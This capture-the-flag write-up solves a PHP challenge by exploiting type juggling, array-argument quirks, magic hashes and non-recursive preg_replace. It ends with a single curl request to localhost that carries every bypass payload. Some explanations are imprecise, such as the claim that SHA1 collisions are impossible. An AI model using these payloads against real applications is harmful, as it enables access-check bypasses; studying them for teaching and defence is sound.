## PHP_Train Writeup
---

```php
if(isset($_GET["param1"])) {
    if(!strcmp($_GET["param1"], CONSTANT1)) {
        echo FLAG1;
    }
}
```
We dont know value of `CONSTANT1`, strcmp must return 0 to make the condition true. Passing Array instead of string, NULL is returned. Due to type juggling, NULL is implicitly converted to 0, and the statement is bypassed.

```php
if(isset($_GET["param2"]) && isset($_GET["param3"])) {
    $str2 = $_GET["param2"];
    $str3 = $_GET["param3"];
    if(($str2 !== $str3) && (sha1($str2) === sha1($str3))) {
        echo FLAG2;
    }
}
```
It is not possible for two non equal entities to have the same SHA1 hash. Note that SHA1 check will only be executed if the type of the variables is string, otherwise it simply ignores the condition. Parameters can be send as Array to bypass the statements. Make sure value of both the parameters are different.

```php
if(isset($_GET["param4"])) {
    $str4 = $_GET["param4"];
    $str4=trim($str4);
    if($str4 == '1.2e3' && $str4 !== '1.2e3') {
        echo FLAG3;
    }
}
```
Due to type juggling, `'1.2e3'` is interpreted as scientic notation of the number `1200`. Passing `1200` or any other variations of the same scientific notation will bypass the statements.

```php
if(isset($_GET["param5"])) {
    $str5 = $_GET["param5"];
    if($str5 == 89 && $str5 !== '89' && $str5 !== 89 && strlen(trim($str5)) == 2) {
        echo FLAG4;
    }
}
```
String Length is checked after passing through trim function. Adding whitespaces to the input parameter will bypass the statements. Passing `89 ` will give us FLAG4.

```php
if(isset($_GET["param6"])) {
    $str6 = $_GET["param6"];
    if(hash('md4', $str6) == 0) {
        echo FLAG5;
    }
}
```
We need to find a string with MD4 hash equal to 0. Strings beginning with `0e` is interpreted as 0, we can get these hashes from writing script, or magic hash list from internet.

```php
if(isset($_GET["param7"])) {
    $str7 = $_GET["param7"];
    $var1 = 'helloworld';
    $var2 = preg_replace("/$var1/", '', $str7);
    if($var1 === $var2) {
        echo FLAG6;
    }
}
```
`preg_replace` function checks if `$var1` is present in `$str7`, if found then it is replaced with `''`. Providing parameter as `hellohelloworldworld`, helloworld is replaced with '' and $var2 takes the value helloworld, giving us the flag;

```php
$comp = range(1, 25);
if(isset($_GET["param8"])) {
    $str8 = $_GET["param8"];
    if(in_array($str8, $comp)) {
        if(preg_match("/\.env/", $str8)) {
            echo FLAG7;
        }
    }
}
```
Here `in_array` function is type unsafe here, because third parameter of the function is not set to true. Hence the parameter is typecasted when comparing with the array. `preg_match` demands the string to have a .env extension. The statment can be bypassed by prepending a number in range 1 to 25, and having a .env match in the parameter.

Since communication to the server is only through GET requests, this can be done either with command line tools like curl, or python scripts, or can be in the browser itself.

```bash
curl http://localhost:4000/\?param1\[\]\=\&param2\[\]\=a\&param3\[\]\=b\&param4\=1200\&param5\=89%20\&param6\=20583002034\&param7\=hellohelloworldworld\&param8\=5.env
```
Flag for the challenge:
```
p_ctf{ech0_1f_7h3_7r41n_d035_n07_5t0p_1n_y0ur_5t4t10n_7h3n_1t5_n07_y0ur_7r41n}
```
